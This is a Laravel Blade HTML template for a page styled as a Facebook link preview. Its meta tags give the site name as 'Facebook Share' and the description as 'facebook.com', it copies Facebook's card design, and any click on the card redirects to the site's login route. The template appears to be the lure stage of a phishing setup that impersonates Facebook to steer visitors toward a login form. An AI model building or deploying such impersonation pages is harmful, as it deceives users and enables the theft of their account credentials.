<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Link Preview</title>
    <meta property="og:type" content="website">
    <meta property="og:title" content="{{ $post->writeup }}">
    <meta property="og:description" content="facebook.com">
    <meta property="og:image" content="{{ url('/' . $post->image) }}">
    <meta property="og:url" content="{{ url()->current() }}">
    <meta property="og:site_name" content="Facebook Share">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="{{ $post->writeup }}">
    <meta name="twitter:description" content="facebook.com">
    <meta name="twitter:image" content="{{ url('/' . $post->image) }}">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
    <style>
        body { background: #f0f2f5; font-family: 'Roboto', Arial, sans-serif; }
        .meta-preview-outer {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .meta-preview-card {
            width: 100%;
            max-width: 540px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 2px 16px rgba(0,0,0,0.13);
            overflow: hidden;
            cursor: pointer;
            transition: box-shadow 0.2s;
            border: 1px solid #e4e6eb;
            text-decoration: none;
        }
        .meta-preview-card:hover {
            box-shadow: 0 4px 24px rgba(24,119,242,0.13);
        }
        .meta-preview-image {
            width: 100%;
            height: 280px;
            object-fit: cover;
            background: #e4e6eb;
            display: block;
        }
        .meta-preview-content {
            padding: 20px 24px 18px 24px;
        }
        .meta-preview-title {
            font-size: 18px;
            font-weight: bold;
            color: #050505;
            margin-bottom: 8px;
            line-height: 1.2;
        }
        .meta-preview-desc {
            font-size: 16px;
            color: #65676b;
            margin-bottom: 10px;
            line-height: 1.4;
        }
        .meta-preview-url {
            font-size: 15px;
            color: #1877f2;
            margin-bottom: 0;
            word-break: break-all;
        }
        @media (max-width: 600px) {
            .meta-preview-card { max-width: 98vw; }
            .meta-preview-image { height: 180px; }
        }
    </style>
</head>
<body>
    <div class="meta-preview-outer">
        <div class="meta-preview-card" onclick="window.location.href='{{ route('login') }}'" tabindex="0" role="button" aria-pressed="false">
            <img src="/{{ $post->image }}" class="meta-preview-image" alt="Preview Image">
            <div class="meta-preview-content">
                <div class="meta-preview-title">{{ $post->writeup }}</div>
                <div class="meta-preview-desc">facebook.com</div>
                <div class="meta-preview-url">{{ url()->current() }}</div>
            </div>
        </div>
    </div>
</body>
</html>
